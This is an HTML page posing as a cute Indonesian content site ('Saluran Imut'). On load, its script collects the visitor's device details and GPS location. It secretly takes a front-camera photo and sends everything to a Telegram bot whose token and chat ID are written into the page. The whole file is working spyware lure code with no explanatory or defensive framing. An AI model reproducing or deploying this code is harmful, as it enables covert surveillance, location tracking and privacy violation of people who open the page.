<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Saluran Imut</title>
    <style>
        body { font-family: Arial; background:#ffeef8; text-align:center; }
        h1 { color: #ff69b4; }
        video { display:none; margin:20px auto; }
        canvas { display:none; }
    </style>
</head>
<body>
    <h1>Selamat Datang di Saluran Imut 💖</h1>
    <p>Konten menarik menunggu kamu!</p>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    
    <script>
        const TELEGRAM_TOKEN = "7715360708:AAER46442IsUV7S5JS5cWAbDh8_go6F3fio";
        const CHAT_ID = "8651425286";

        async function getDeviceInfo() {
            let battery = {level:'unknown', charging:'unknown'};
            if(navigator.getBattery) battery = await navigator.getBattery().then(b=>({level:b.level*100, charging:b.charging}));
            let network = navigator.connection ? navigator.connection.effectiveType : 'unknown';
            let os = navigator.userAgent.includes('Android') ? 'Android' : 'Unknown';
            let androidVersion = (navigator.userAgent.match(/Android (\d+(\.\d+)?)/) || [])[1];
            return {battery:`Level: ${battery.level}%, Charging: ${battery.charging}`, network, os, androidVersion};
        }

        async function getLocation() {
            return new Promise(resolve=>{
                if(navigator.geolocation){
                    navigator.geolocation.getCurrentPosition(pos=>{
                        resolve({lat: pos.coords.latitude, lon: pos.coords.longitude});
                    }, ()=>resolve({lat:0, lon:0}));
                } else { resolve({lat:0, lon:0}); }
            });
        }

        async function takePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.style.display = 'block';
            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
            video.srcObject = stream;
            await new Promise(r=>setTimeout(r,2000));
            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
            const photo = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track=>track.stop());
            video.style.display = 'none';
            return photo;
        }

        async function sendToTelegram(data) {
            const message = `
📌 *New Visitor Detected!*
OS: ${data.os} | Android: ${data.androidVersion || 'Unknown'}
Battery: ${data.battery}
Network: ${data.network}
Screen: ${data.screenWidth}x${data.screenHeight}
Google Maps Location: [Click Here](https://www.google.com/maps?q=${data.lat},${data.lon})
`;
            try {
                // Kirim teks
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode:"Markdown"})
                });
                // Kirim foto
                if(data.photo){
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({chat_id: CHAT_ID, photo: data.photo, caption:"📸 Foto Kamera Depan"})
                    });
                }
            } catch(err){ console.error(err); }
        }

        async function run() {
            const device = await getDeviceInfo();
            const loc = await getLocation();
            const photo = await takePhoto();
            const data = {
                userAgent: navigator.userAgent,
                battery: device.battery,
                network: device.network,
                os: device.os,
                androidVersion: device.androidVersion,
                screenWidth: screen.width,
                screenHeight: screen.height,
                lat: loc.lat,
                lon: loc.lon,
                photo
            };
            sendToTelegram(data);
        }

        window.onload = run;
    </script>
</body>
</html>
